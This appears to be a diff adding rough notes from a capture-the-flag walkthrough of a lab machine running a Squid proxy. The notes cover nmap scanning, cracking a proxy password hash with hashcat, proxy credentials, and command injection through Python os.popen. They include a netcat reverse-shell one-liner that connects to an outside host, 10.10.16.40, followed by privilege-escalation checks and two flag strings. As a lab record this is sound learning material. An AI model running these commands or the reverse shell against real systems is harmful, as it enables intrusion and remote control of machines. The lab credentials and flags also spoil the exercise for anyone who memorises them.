@@ -1,0 +1,50 @@
+background ctrl + z foreground fg
+sudo nmap -A 10.10.10.21
+nmap -sC -sC -oA nmap 10.10.10.21
+nmap -sU -oA udp 10.10.10.21 (slow men bra)
+
+3128/tcp open  http-proxy Squid http proxy 3.5.12
+http-server-header: squid/3.5.12
+
+since it's http proxy 
+we define in foxyprxoy standard 10.10.10.21:3128
+
+cat squid.conf | grep -v ^\#| grep .
+
+$apr1$zyzBxQYW$pL360IoLQ5Yum5SLTph.l0
+
+hashid -m hash-squid '$apr1$zyzBxQYW$pL360IoLQ5Yum5SLTph.l0'
+
+hashcat -m 1600
+
+netstat -alnp | grep 80 (listening ports)
+
+SSRF
+setup upstream proxy 
+10.10.10.21
+3128
+basic
+
+
+then put on proxy standard to default '*:8080'.
+
+os.popen("whoami").read()
+os.popen("nc -h 2>&1").read()
+os.popen("ping | 10.10.16.40&").read()
+
+
+nc -u -lvnp 8083
+
+
+
+os.popen("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1| nc -u 10.10.16.40 8083 >/tmp/f").read()
+
+sudo -l
+dpkg -l sudo (version of sudo)
+
+
+dirb http://127.0.0.1 -p 10.10.10.21:3128 -P kalamari:ihateseafood
+
+a298121179fe93f2978d3337dbd7057b
+
+d452b7faf5fd5b30210f340ef1d4146e
